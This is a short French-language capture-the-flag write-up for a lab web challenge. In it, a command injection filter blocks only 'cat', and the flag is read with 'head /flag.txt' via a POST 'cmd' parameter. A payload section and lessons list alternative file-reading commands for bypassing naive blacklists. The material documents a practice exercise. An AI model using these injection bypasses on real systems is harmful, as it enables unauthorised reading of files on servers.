---
doc_kind: writeup
title: "ThunderCipher Unleashing the Shell 2 - contournement blacklist cat par commandes alternatives"
category: web
slug: unleashing-shell2-blacklist-bypass-altcmd
created: 2026-10-29
status: solved
tags:
  - command-injection
  - blacklist-bypass
  - alt-read-commands
  - waf-evasion
source: thundercipher.in/labs
target: "Filtre RCE blacklist mono-commande"
---
# ThunderCipher Unleashing the Shell 2 - contournement blacklist cat par commandes alternatives

## Challenge Summary

- Source: thundercipher.in/labs
- Target: Filtre RCE blacklist mono-commande
- Goal: La version corrigee du challenge ne filtre que la commande cat; les commandes alternatives de lecture (head, tac, base64, strings, nl, rev, od) restent fonctionnelles.

## Initial Signals

- Entry point: see Exploit Chain step 1
- Visible hints: n/a (see source writeup)
- First confirming probe: see Exploit Chain

## Exploit Chain

1. POST cmd=cat /flag.txt -> reponse vide (cat filtre).
2. POST cmd=head /flag.txt -> flag retourne en clair.

## Key Evidence

- Reponse vide avec cat vs contenu complet du flag avec head sur la meme route.

## Dead Ends

- n/a (see Reusable Lessons)

## Payloads And Commands

```text
POST --data-urlencode 'cmd=head /flag.txt' (ou tac/base64/strings/nl/rev/od selon le filtre).
```

## Flag / Outcome

- Flag obtenu, chaine confirmee de bout en bout.

## Reusable Lessons

- Memoriser la liste de commandes equivalentes a cat (head, tail, tac, more, less, nl, od, strings, base64, rev) pour tout filtre naif mono-commande.

## Pattern Candidates

- Voir pattern associe de meme slug.
